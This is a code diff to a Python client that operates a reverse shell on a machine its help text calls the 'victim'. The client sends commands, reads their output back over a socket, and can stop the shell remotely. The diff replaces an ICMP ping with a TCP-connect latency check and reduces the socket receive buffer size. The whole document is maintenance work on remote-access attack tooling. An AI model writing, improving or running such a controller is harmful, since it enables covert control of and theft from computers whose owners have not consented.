@@ -1,4 +1,3 @@
-from scapy.all import sr1, IP, ICMP
 from colorama import Fore
 import socket
 import time
@@ -16,26 +15,29 @@ help{pipe}Prints this menu
 cls - clear{pipe}Clears this console
 exit - close{pipe}Closes this client and connection
 stop{pipe}Stops the reverse shell on {victim}
-ping{pipe}Gives you the ping between you and the {victim}
+ping{pipe}Gives you the TCP connect latency between you and the {victim}
 '''
 
 def ping():
     pings = []
-    pkt = IP(dst=server_ip)/ICMP()
     for i in range(5):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
         start = time.time()
-        resp = sr1(pkt, timeout=2, verbose=0)
-        end = time.time()
-        if resp is None:
-            print(f"{server_ip} is unreachable.")
-        else:
+        try:
+            s.connect((server_ip, server_port))
+            end = time.time()
             rtt = (end - start) * 1000
             pings.append(rtt)
+        except Exception:
+            print(f"{server_ip} is unreachable.")
+        finally:
+            s.close()
     if pings:
         avg = sum(pings) / len(pings)
-        print(f"Average RTT: {avg:.2f} ms")
+        print(f"Average TCP RTT: {avg:.2f} ms")
     else:
-        print("No replies received.")
+        print("No TCP replies received.")
 
 try:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -66,11 +68,11 @@ try:
         
         result = b""
         while True:
-            data = sock.recv(4096)
+            data = sock.recv(1024)
             if not data:
                 break
             result += data
-            if len(data) < 4096:
+            if len(data) < 1024:
                 break
         
         print(result.decode())
